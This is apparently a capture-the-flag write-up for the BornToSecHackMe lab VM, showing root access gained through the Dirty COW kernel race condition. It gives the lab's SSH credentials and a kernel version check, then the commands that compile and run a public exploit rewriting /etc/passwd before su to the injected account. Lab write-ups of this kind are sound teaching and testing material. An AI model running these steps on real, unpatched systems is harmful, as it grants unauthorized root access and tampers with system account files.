# BONUS1 : DIRTY COW

When we search a way to get root on syslinux for writeup2, we found an other way called dirtycow, who exploit a `race-condition vulnerability`. (
[dirty cow](https://en.wikipedia.org/wiki/Dirty_COW#:~:text=The%20vulnerability%20has%20been%20patched,26%20and%20newer.))

This vulnerability is fixed on kernel version 4.8 and superior, so we need to know our version of kernel, and be connected:

ssh user: `thor`  
ssh password: `Publicspeakingisveryeasy.126241207201b2149opekmq426135`

```bash
ssh thor@{IP}

> uname -a
Linux BornToSecHackMe 3.2.0-91-generic-pae #129-Ubuntu SMP Wed Sep 9 11:27:47 UTC 2015 i686 i686 i386 GNU/Linux

```

We are now sure that dirtycow is possible, the version is bellow 4.8.

After some tests, we found this script of dirty cow who works on our vm : [dirtycow link](https://github.com/FireFart/dirtycow)

This exploit uses the pokemon exploit of the dirtycow vulnerability as a base and automatically generates a new passwd line in /etc/passwd.

We create a file dirty.c with this script, then run with the command given by the creator of the script:

```bash
> gcc -pthread dirty.c -o dirty -lcrypt
> ./dirty
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: test

> su firefart
Password: test
```

After this, we need to restore `/etc/passwd` with `mv /tmp/passwd.bak /etc/passwd`.

```bash
> whoami
root
```